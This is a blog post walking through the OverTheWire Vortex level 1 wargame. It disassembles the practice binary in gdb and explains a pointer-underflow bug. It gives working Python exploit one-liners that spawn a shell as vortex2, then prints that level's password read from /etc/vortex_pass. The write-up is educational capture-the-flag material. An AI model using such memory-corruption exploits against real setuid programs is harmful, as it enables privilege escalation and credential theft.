
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <title>My Solution to Over the Wire Vortex Level 1 -> 2 - David Xia</title>
  <meta name="author" content="David Xia">

  
  <meta name="description" content="My Solution to Over the Wire Vortex Level 1 -> 2 December 25, 2020 | By David Xia I recently found a whole new series of online wargames at [overthewire.org &hellip;&#8221;>
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="David Xia" type="application/atom+xml">

  <meta property="og:site_name" content="David Xia" />
  <meta property="og:title" content="My Solution to Over the Wire Vortex Level 1 -> 2 - David Xia&#8221; />
  <meta property="og:type" content="article" />
  <meta property="og:url" content="https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2/" />
  <meta property="og:image" content="https://i.imgur.com/BJPOY0D.jpg" />
  <meta property="og:locale" content="en_US" />
  <meta property="og:description" content="My Solution to Over the Wire Vortex Level 1 -> 2 December 25, 2020 | By David Xia I recently found a whole new series of online wargames at [overthewire.org &hellip;&#8221; />
  <meta property="fb:admins" content="122703" />

  <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
<![endif]-->

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-25283538-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


  
  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
    (adsbygoogle = window.adsbygoogle || []).push({
      google_ad_client: "ca-pub-1777254647176109",
      enable_page_level_ads: true
    });
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <div class="navbar" role="navigation">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <h1><a class="navbar-brand" href="/">David Xia</a></h1>
      </div>
      <div class="navbar-collapse collapse">
        <ul class="nav navbar-nav">
          <li><a href="/about">About</a></li>
          <li><a href="/work">Work</a></li>
          <li><a href="/contact">Contact</a></li>
        </ul>
      </div><!--/.navbar-collapse -->
    </div>
  </div>
</hgroup>

</header>
  <div itemscope itemtype="https://schema.org/Brand">
  <meta itemprop="url" content="https://www.gravatar.com/avatar/5631ab903c74aea4375f39259e52ccd1.png">
</div>

  <div class="container main">
    <div class="row">
      <div class="col-md-8">
  <article itemscope itemtype="http://schema.org/BlogPosting" class="hentry first" role="article">
    
  <header>
    <span itemprop="name headline">
      
        <h2 class="entry-title">My Solution to Over the Wire Vortex Level 1 -> 2</h2>
      
    </span>
    <link itemprop="mainEntityOfPage" href="https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2/">
    
      <p class="meta">
        
  
  

  
    
  

  
    
  



<span itemprop="datePublished" content="December 25, 2020"><time class='entry-date' datetime='2020-12-25T20:21:28-05:00'><span class='date'>December 25, 2020</span></time></span>
<meta itemprop="dateModified" content="December 25, 2020">
 | 
  



  <span class="byline author vcard">
    By <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name" class="fn">David Xia</span></span>
  </span>


        
        <div itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
  <meta itemprop="name" content="David Xia">
  <div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject">
    <meta itemprop="url" content="https://www.gravatar.com/avatar/5631ab903c74aea4375f39259e52ccd1.png">
  </div>
</div>

        <span itemprop="image" itemscope itemtype="https://schema.org/ImageObject">
  
    
    
    
  
  <meta itemprop="url" content="https://i.imgur.com/BJPOY0D.jpg">
  <meta itemprop="height" content="696">
  <meta itemprop="width" content="696">
</span>

      </p>
    
  </header>


  <div class="entry-content"><p>I recently found a whole new series of online wargames at [overthewire.org][].
Here&rsquo;s my solution for the second level &ldquo;<a href="https://overthewire.org/wargames/vortex/vortex1.html">Vortex Level 1 -> Level 2</a>&rdquo;</p>

<p>The levels are cumulative. We have to beat the previous level in order to access the next. This
solution assumes we have solved &ldquo;<a href="https://overthewire.org/wargames/vortex/vortex0.html">Vortex Level 0 -> Level 1</a>&rdquo; and can SSH into the
machine as user vortex1. Caveat: the machine is extremely slow&hellip;</p>

<!-- more -->


<p>First let&rsquo;s find out some information about the machine.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh vortex1@vortex.labs.overthewire.org -p 2228
</span><span class='line'>                 _
</span><span class='line'>__   _____  _ __| |_ _____  __
</span><span class='line'>\ \ / / _ \| '__| __/ _ \ \/ /
</span><span class='line'> \ V / (_) | |  | ||  __/&gt;  &lt;
</span><span class='line'>  \_/ \___/|_|   \__\___/_/\_\
</span><span class='line'>
</span><span class='line'>a http://www.overthewire.org wargame.
</span><span class='line'>
</span><span class='line'>vortex1@vortex.labs.overthewire.org's password:
</span><span class='line'>Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s a machine running Ubuntu 14.04.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vortex1@vortex:~$ uname -i
</span><span class='line'>x86_64</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s a 64-bit system.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vortex1@vortex:~$ cat /proc/sys/kernel/randomize_va_space
</span><span class='line'>0</span></code></pre></td></tr></table></div></figure>


<p>ASLR is disabled.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vortex1@vortex:~$ gdb /vortex/vortex1
</span><span class='line'>GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
</span><span class='line'>Copyright (C) 2014 Free Software Foundation, Inc.
</span><span class='line'>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
</span><span class='line'>This is free software: you are free to change and redistribute it.
</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
</span><span class='line'>and "show warranty" for details.
</span><span class='line'>This GDB was configured as "x86_64-linux-gnu".
</span><span class='line'>Type "show configuration" for configuration details.
</span><span class='line'>For bug reporting instructions, please see:
</span><span class='line'>&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
</span><span class='line'>Find the GDB manual and other documentation resources online at:
</span><span class='line'>&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
</span><span class='line'>For help, type "help".
</span><span class='line'>Type "apropos word" to search for commands related to "word"...
</span><span class='line'>Reading symbols from /vortex/vortex1...(no debugging symbols found)...done.
</span><span class='line'>
</span><span class='line'>(gdb) set disassembly-flavor intel
</span><span class='line'>(gdb) set pagination off
</span><span class='line'>(gdb) disassemble main
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x080485c0 &lt;+0&gt;: push   ebp
</span><span class='line'>   0x080485c1 &lt;+1&gt;: mov    ebp,esp
</span><span class='line'>   0x080485c3 &lt;+3&gt;: push   esi
</span><span class='line'>   0x080485c4 &lt;+4&gt;: push   ebx
</span><span class='line'>   0x080485c5 &lt;+5&gt;: and    esp,0xfffffff0
</span><span class='line'>   0x080485c8 &lt;+8&gt;: sub    esp,0x220                  # Set stack pointer
</span><span class='line'>   0x080485ce &lt;+14&gt;:    mov    eax,gs:0x14
</span><span class='line'>   0x080485d4 &lt;+20&gt;:    mov    DWORD PTR [esp+0x21c],eax  
</span><span class='line'>   0x080485db &lt;+27&gt;:    xor    eax,eax
</span><span class='line'>   0x080485dd &lt;+29&gt;:    lea    eax,[esp+0x1c]
</span><span class='line'>   0x080485e1 &lt;+33&gt;:    add    eax,0x100                  # + (sizeof(buf) / 2)
</span><span class='line'>   0x080485e6 &lt;+38&gt;:    mov    DWORD PTR [esp+0x14],eax   # ptr is located at $esp + 0x14
</span><span class='line'>   0x080485ea &lt;+42&gt;:    jmp    0x804868e &lt;main+206&gt;
</span><span class='line'>   0x080485ef &lt;+47&gt;:    mov    eax,DWORD PTR [esp+0x18]
</span><span class='line'>   0x080485f3 &lt;+51&gt;:    cmp    eax,0xa
</span><span class='line'>   0x080485f6 &lt;+54&gt;:    je     0x80485ff &lt;main+63&gt;
</span><span class='line'>   0x080485f8 &lt;+56&gt;:    cmp    eax,0x5c
</span><span class='line'>   0x080485fb &lt;+59&gt;:    je     0x8048615 &lt;main+85&gt;
</span><span class='line'>   0x080485fd &lt;+61&gt;:    jmp    0x804861c &lt;main+92&gt;
</span><span class='line'>   0x080485ff &lt;+63&gt;:    mov    DWORD PTR [esp+0x4],0x200
</span><span class='line'>   0x08048607 &lt;+71&gt;:    lea    eax,[esp+0x1c]
</span><span class='line'>   0x0804860b &lt;+75&gt;:    mov    DWORD PTR [esp],eax
</span><span class='line'>   0x0804860e &lt;+78&gt;:    call   0x804856d &lt;print&gt;
</span><span class='line'>   0x08048613 &lt;+83&gt;:    jmp    0x804868e &lt;main+206&gt;
</span><span class='line'>   0x08048615 &lt;+85&gt;:    sub    DWORD PTR [esp+0x14],0x1
</span><span class='line'>   0x0804861a &lt;+90&gt;:    jmp    0x804868e &lt;main+206&gt;
</span><span class='line'>   0x0804861c &lt;+92&gt;:    mov    eax,DWORD PTR [esp+0x14]
</span><span class='line'>   0x08048620 &lt;+96&gt;:    and    eax,0xff000000
</span><span class='line'>   0x08048625 &lt;+101&gt;:   cmp    eax,0xca000000
</span><span class='line'>   0x0804862a &lt;+106&gt;:   jne    0x804866b &lt;main+171&gt;
</span><span class='line'>   0x0804862c &lt;+108&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
</span><span class='line'>   0x08048631 &lt;+113&gt;:   mov    esi,eax
</span><span class='line'>   0x08048633 &lt;+115&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
</span><span class='line'>   0x08048638 &lt;+120&gt;:   mov    ebx,eax
</span><span class='line'>   0x0804863a &lt;+122&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
</span><span class='line'>   0x0804863f &lt;+127&gt;:   mov    DWORD PTR [esp+0x8],esi
</span><span class='line'>   0x08048643 &lt;+131&gt;:   mov    DWORD PTR [esp+0x4],ebx
</span><span class='line'>   0x08048647 &lt;+135&gt;:   mov    DWORD PTR [esp],eax
</span><span class='line'>   0x0804864a &lt;+138&gt;:   call   0x80483e0 &lt;setresuid@plt&gt;
</span><span class='line'>   0x0804864f &lt;+143&gt;:   mov    DWORD PTR [esp+0x8],0x0
</span><span class='line'>   0x08048657 &lt;+151&gt;:   mov    DWORD PTR [esp+0x4],0x804876a
</span><span class='line'>   0x0804865f &lt;+159&gt;:   mov    DWORD PTR [esp],0x804876d
</span><span class='line'>   0x08048666 &lt;+166&gt;:   call   0x8048420 &lt;execlp@plt&gt;
</span><span class='line'>   0x0804866b &lt;+171&gt;:   lea    eax,[esp+0x1c]
</span><span class='line'>   0x0804866f &lt;+175&gt;:   add    eax,0x200
</span><span class='line'>   0x08048674 &lt;+180&gt;:   cmp    DWORD PTR [esp+0x14],eax
</span><span class='line'>   0x08048678 &lt;+184&gt;:   jbe    0x804867c &lt;main+188&gt;
</span><span class='line'>   0x0804867a &lt;+186&gt;:   jmp    0x804868d &lt;main+205&gt;
</span><span class='line'>   0x0804867c &lt;+188&gt;:   mov    eax,DWORD PTR [esp+0x14]
</span><span class='line'>   0x08048680 &lt;+192&gt;:   lea    edx,[eax+0x1]
</span><span class='line'>   0x08048683 &lt;+195&gt;:   mov    DWORD PTR [esp+0x14],edx
</span><span class='line'>   0x08048687 &lt;+199&gt;:   mov    edx,DWORD PTR [esp+0x18]
</span><span class='line'>   0x0804868b &lt;+203&gt;:   mov    BYTE PTR [eax],dl
</span><span class='line'>   0x0804868d &lt;+205&gt;:   nop
</span><span class='line'>   0x0804868e &lt;+206&gt;:   call   0x8048400 &lt;getchar@plt&gt;
</span><span class='line'>   0x08048693 &lt;+211&gt;:   mov    DWORD PTR [esp+0x18],eax          # x is located at $esp + 0x18
</span><span class='line'>   0x08048697 &lt;+215&gt;:   cmp    DWORD PTR [esp+0x18],0xffffffff
</span><span class='line'>   0x0804869c &lt;+220&gt;:   jne    0x80485ef &lt;main+47&gt;
</span><span class='line'>   0x080486a2 &lt;+226&gt;:   mov    DWORD PTR [esp],0x8048775
</span><span class='line'>   0x080486a9 &lt;+233&gt;:   call   0x8048440 &lt;puts@plt&gt;
</span><span class='line'>   0x080486ae &lt;+238&gt;:   mov    eax,0x0
</span><span class='line'>   0x080486b3 &lt;+243&gt;:   mov    ecx,DWORD PTR [esp+0x21c]
</span><span class='line'>   0x080486ba &lt;+250&gt;:   xor    ecx,DWORD PTR gs:0x14
</span><span class='line'>   0x080486c1 &lt;+257&gt;:   je     0x80486c8 &lt;main+264&gt;
</span><span class='line'>   0x080486c3 &lt;+259&gt;:   call   0x8048410 &lt;__stack_chk_fail@plt&gt;
</span><span class='line'>   0x080486c8 &lt;+264&gt;:   lea    esp,[ebp-0x8]
</span><span class='line'>   0x080486cb &lt;+267&gt;:   pop    ebx
</span><span class='line'>   0x080486cc &lt;+268&gt;:   pop    esi
</span><span class='line'>   0x080486cd &lt;+269&gt;:   pop    ebp
</span><span class='line'>   0x080486ce &lt;+270&gt;:   ret
</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>


<p>We can see that on main+8, the stack pointer <code>esp</code> is decreased by 0x220 to make room for <code>unsigned
char buf[512]</code>, <code>unsigned char *ptr</code>, and <code>unsigned int x</code>. If we look more closely at the assembly,
we can see <code>ptr</code> is located at <code>esp + 0x14</code> because the instruction before that increases <code>eax</code> by
<code>0x100</code> or <code>(sizeof(buf) / 2)</code> or 256. <code>main+211</code> shows <code>x</code> is located right after <code>ptr</code> at <code>esp +
0x18</code> since the instruction right before calls <code>getchar()</code>. This means <code>buf[512]</code> is after that and
takes up the majority of the stack. So the stack layout is <code>ptr</code>, <code>x</code>, then <code>buf[512]</code>. This makes
sense because the compiler on more modern systems will put buffers after other variables to protect
against buffer overflows.</p>

<p>Question: why is the size of <code>ptr</code> only 4 bytes? I thought on 64-bit systems pointer variables are 8
bytes not 4 since memory should be 64-bit- or 8-byte-addressable?</p>

<p>We set a breakpoint at the <code>getchar()</code> call and run the program. Examine the first 64 words of <code>esp</code>
in hexadecimal.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) break *main+206
</span><span class='line'>Breakpoint 1 at 0x804868e
</span><span class='line'>
</span><span class='line'>(gdb) run
</span><span class='line'>Starting program: /vortex/vortex1
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x0804868e in main ()
</span><span class='line'>
</span><span class='line'>(gdb) x/64wx $esp
</span><span class='line'>0xffffd4c0:   0xf7e303b4  0xf7fd81a8  0x00000000  0xf7fec4a8
</span><span class='line'>0xffffd4d0:   0x00000007  0xffffd5dc  0x00000001  0x00000000
</span><span class='line'>0xffffd4e0:   0x00000001  0xf7fd81a8  0xf7ffd000  0xf7fe6d3b
</span><span class='line'>0xffffd4f0:   0xf7ffc000  0x00001000  0x00000001  0xf7fe6cfc
</span><span class='line'>0xffffd500:   0xf7ffd000  0x00000000  0xffffd5c8  0xf7fe724b
</span><span class='line'>0xffffd510:   0xf7ffdaf0  0xf7fd8760  0x00000001  0x00000001
</span><span class='line'>0xffffd520:   0x00000000  0xf7ff578c  0x00000000  0x00000000
</span><span class='line'>0xffffd530:   0xf7ffd55c  0xffffd598  0xffffd5b8  0x00000000
</span><span class='line'>0xffffd540:   0xf7ff578c  0xf7ffd55c  0xffffd5b8  0xf7fdc4ac
</span><span class='line'>0xffffd550:   0xf7fdc2dc  0xf7fe4f3d  0xf7e36061  0x080482ff
</span><span class='line'>0xffffd560:   0x00000000  0xf7fdc33c  0x00000000  0xf7fdc000
</span><span class='line'>0xffffd570:   0x00000040  0x00000002  0x0804827d  0xf7ffdc24
</span><span class='line'>0xffffd580:   0xf7e226bc  0xf7ffd000  0xf7e26cc4  0x00000001
</span><span class='line'>0xffffd590:   0xf7fd8460  0xf7fe5694  0x00000000  0x00000000
</span><span class='line'>0xffffd5a0:   0x00000000  0x00000000  0xf7fd8460  0x00000003
</span><span class='line'>0xffffd5b0:   0xffffd5e0  0x07b1ea71  0xf63d4e2e  0xf7e26ed4</span></code></pre></td></tr></table></div></figure>


<p><code>ptr</code> is located at <code>$esp + 0x14 = 0xffffd4d4</code> which is initialized with a value of <code>0xffffd5dc</code>.
Since ASLR is disabled, this location is fixed.</p>

<p>I first thought of a brute-force strategy of decrementing <code>ptr</code>&rsquo;s value with <code>\</code> until its highest
byte was <code>0xca</code>. That way, when it&rsquo;s bit-wise ANDed with <code>0xff000000</code>, the result would be
<code>0xca000000</code>. The exploit command would be the following.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(python -c 'import sys; sys.stdout.write("\\" * (0xffffe470-0xcaffffff) + "\x00")'; cat) \
</span><span class='line'>  | /vortex/vortex1</span></code></pre></td></tr></table></div></figure>


<p>Aside: the Python command is run in a subshell with an extra <code>cat</code> to keep the <code>/bin/sh</code> listening
to more input from the stdout of that subshell. That way we can add more commands from your
terminal. The Python command triggers the <code>/bin/sh</code>. The <code>cat</code> with no args just reads from the
current stdin and feeds data to <code>/bin/sh</code>. See this <a href="https://security.stackexchange.com/a/155845/4350">Stack Exchange answer</a>.</p>

<p>This is most definitely not the &ldquo;right&rdquo; solution because 0xffffd5dc - 0xcaffffff = 0x34ffd5dd =
889,181,661. If written to disk, this file be almost a gigabyte.</p>

<p>Let&rsquo;s think of a better solution. There&rsquo;s no lower bound checking on <code>ptr</code>&rsquo;s value. So we can
decrement the value of ptr until it references its own memory address which starts at <code>0xffffd4d4</code>.
Then we write <code>0xca</code> into the highest byte at <code>0xffffd4d7</code>. <code>ptr</code>&rsquo;s value is initialized to
<code>0xffffd5dc</code>. So we write this many <code>\</code>: 0xffffd5dc - 0xffffd4d7 = 0x105 = 261. Instead of the
seemingly arbitrary 261, we&rsquo;ll use 512/2 + 5. This is more descriptive because it shows we&rsquo;re moving
the <code>ptr</code> reference from where it starts in the middle of <code>buf[512]</code> back to the beginning and then
past the <code>x</code> and one byte into itself.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(python -c 'import sys; sys.stdout.write("\\" * (512/2 + 5) + "\xca" + "A")'; cat) \
</span><span class='line'>  | /vortex/vortex1
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'>uid=5002(vortex2) gid=5001(vortex1) groups=5002(vortex2),5001(vortex1)</span></code></pre></td></tr></table></div></figure>


<p>The wargame instructions don&rsquo;t tell you this, but each user&rsquo;s password is located in the directory
below. Now that we have a shell as vortex2, we can read the password to advance to the next level.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /etc/vortex_pass
</span><span class='line'>vortex0   vortex11  vortex14  vortex17    vortex2   vortex22  vortex25  vortex5  vortex8
</span><span class='line'>vortex1   vortex12  vortex15  vortex18    vortex20  vortex23  vortex3   vortex6  vortex9
</span><span class='line'>vortex10  vortex13  vortex16  vortex19    vortex21  vortex24  vortex4   vortex7
</span><span class='line'>
</span><span class='line'>cat /etc/vortex_pass/vortex2
</span><span class='line'>23anbT\rE</span></code></pre></td></tr></table></div></figure>



</div>


    <ul class="post-meta">
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    </ul>
    <footer>
      <p class="meta">
        

<span class="categories">
  
    Categories: <a class='category' href='/categories/programming-and-software/'>Programming & Software</a>
  
</span>


      </p>
      
        <div class="sharing">
  
    <a id="custom-tweet-button" title="tweet about My Solution to Over The Wire Vortex Level 1 -> 2&#8221; href=&#8221;https://twitter.com/share?url=https%3A%2F%2Fwww.davidxia.com%2F2020%2F12%2Fmy-solution-to-over-the-wire-vortex-level-1-2%2F&text=My%20Solution%20to%20Over%20The%20Wire%20Vortex%20Level%201%20-%3E%202&via=davidxia_&#8221; target=&#8221;_blank&#8221; rel=&#8221;nofollow&#8221;>tweet</a>
  
  
    <a id="custom-google-share-button" title="share My Solution to Over The Wire Vortex Level 1 -> 2&#8221; href=&#8221;https://plus.google.com/share?url=https%3A%2F%2Fwww.davidxia.com%2F2020%2F12%2Fmy-solution-to-over-the-wire-vortex-level-1-2%2F&#8221; target=&#8221;_blank&#8221; rel=&#8221;nofollow&#8221;>Google+</a>
  
  
    <a id="custom-facebook-share-button" title="share My Solution to Over The Wire Vortex Level 1 -> 2 on Facebook&#8221; href=&#8221;http://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.davidxia.com%2F2020%2F12%2Fmy-solution-to-over-the-wire-vortex-level-1-2%2F&t=My%20Solution%20to%20Over%20The%20Wire%20Vortex%20Level%201%20-%3E%202&#8221; target=&#8221;_blank&#8221; rel=&#8221;nofollow&#8221;>facebook</a>
  
</div>

      
      <div class="meta np-page-links-div">
        
          <div class="basic-alignment left col-md-6">
            <a class="np-page-link" href="/2020/11/my-solution-to-exploit-exercises-protostar-final2-level/" title="Previous Post: My Solution to Exploit Exercises Protostar Final2 Level">&larr; My Solution to Exploit Exercises Protostar Final2 Level</a>
          </div>
        
        
        <div class="clear"></div>
      </div>
    </footer>
  </article>
  
    <section>
      <h1>Comments</h1>
      <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
    </section>
  
</div>

<div class="col-md-4">
  <aside class="well sidebar-nav">
    
      
<section>
  <h3>About</h3>
  <p>I&#8217;m David Xia. I write software and occasionally prose.</p>
</section>


<!-- side nav ad -->
<ins class="adsbygoogle"
     style="display:inline-block;width:300px;height:250px"
     data-ad-client="ca-pub-1777254647176109"
     data-ad-slot="8066618875"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>


<section>
  <h3>Elsewhere</h3>
  <span itemscope itemtype="http://schema.org/Person">
  <ul>
    
    <li><a itemprop="sameAs" href="https://twitter.com/davidxia_" rel="me" title="David Xia’s " target="_self">Twitter</a></li>
    
    <li><a itemprop="sameAs" href="https://www.facebook.com/david.xia2" rel="me" title="David Xia’s " target="_self">Facebook</a></li>
    
    <li><a itemprop="sameAs" href="https://www.snapchat.com/add/david.xia2" rel="me" title="David Xia’s " target="_self">Snapchat</a></li>
    
    <li><a itemprop="sameAs" href="https://github.com/davidxia2" rel="me" title="David Xia’s " target="_self">GitHub</a></li>
    
    <li><a itemprop="sameAs" href="https://keybase.io/davidxia" rel="me" title="David Xia’s " target="_self">Keybase</a></li>
    
    <li><a itemprop="sameAs" href="https://www.instagram.com/david.xia/" rel="me" title="David Xia’s " target="_self">Instagram</a></li>
    
    <li><a itemprop="sameAs" href="https://www.youtube.com/user/dx314152653" rel="me" title="David Xia’s " target="_self">Youtube</a></li>
    
    <li><a itemprop="sameAs" href="https://www.linkedin.com/in/davidweixia" rel="me" title="David Xia’s " target="_self">LinkedIn</a></li>
    
    <li><a itemprop="sameAs" href="https://plus.google.com/111695463592724886678?rel=author" rel="me" title="David Xia’s " target="_self">Google+</a></li>
    
    <li><a itemprop="sameAs" href="https://vimeo.com/davidxia" rel="me" title="David Xia’s " target="_self">Vimeo</a></li>
    
    <li><a itemprop="sameAs" href="https://stackoverflow.com/users/553994/david-xia" rel="me" title="David Xia’s " target="_self">StackOverflow</a></li>
    
  </ul>
  </span>
</section>

<section>
  <h3>Wise Words</h3>
  <p id="rquote"></p>
